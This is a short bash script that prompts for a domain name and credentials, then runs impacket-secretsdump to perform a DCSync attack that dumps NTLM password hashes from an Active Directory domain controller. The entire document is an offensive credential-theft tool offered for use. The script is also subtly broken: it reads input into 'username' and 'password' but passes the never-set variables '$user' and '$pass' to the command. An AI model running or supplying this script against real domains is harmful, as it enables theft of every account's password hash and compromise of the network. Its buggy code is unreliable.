#!/bin/bash
BOLD="\033[1m"
RED="\033[31m"
RESET="\033[0m"

echo -e "${BOLD}${RED}wow !  Main(DC_sync)  dumping of hashes ---<${RESET}"

 
echo "Domain: "
read domain

echo "username: "
read username

echo "password: "
read password

impacket-secretsdump -just-dc-ntlm  $domain/$user:$pass
